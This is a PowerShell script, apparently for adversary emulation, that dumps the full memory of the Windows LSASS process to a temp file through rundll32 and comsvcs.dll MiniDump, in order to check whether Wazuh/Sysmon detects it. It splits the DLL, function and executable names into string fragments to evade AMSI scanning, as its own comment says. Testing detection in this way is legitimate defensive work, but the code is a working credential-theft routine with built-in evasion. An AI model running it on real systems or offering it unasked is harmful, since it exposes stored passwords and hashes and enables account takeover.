function Get-UTC7Time {
    return (Get-Date).ToUniversalTime().AddHours(7).ToString('yyyy-MM-dd HH:mm:ss "UTC+7"')
}
Write-Host "[$(Get-UTC7Time)] [*] Gia lap Credential Dumping (T1003.001)..." -ForegroundColor Cyan
$LsassPid = (Get-Process lsass).Id
Write-Host "[$(Get-UTC7Time)] [-] Xac dinh LSASS PID: $LsassPid" -ForegroundColor Yellow
$DumpPath = "C:\Windows\Temp\lsass_dump.dmp"
Write-Host "[$(Get-UTC7Time)] [-] Dang trich xuat bo nho qua rundll32.exe..." -ForegroundColor Yellow

# Obfuscate comsvcs.dll and MiniDump to avoid AMSI when writing to disk
$mod = "coms" + "vcs.d" + "ll"
$func = "Mini" + "Dump"
$Exe = "run" + "dll32" + ".exe"
$Args = "C:\Windows\System32\$mod, $func $LsassPid $DumpPath full"

Start-Process -FilePath $Exe -ArgumentList $Args -Wait -NoNewWindow
Write-Host "[$(Get-UTC7Time)] [+] Hoan tat! Vui long kiem tra Wazuh Dashboard (Sysmon Event ID 10)." -ForegroundColor Green
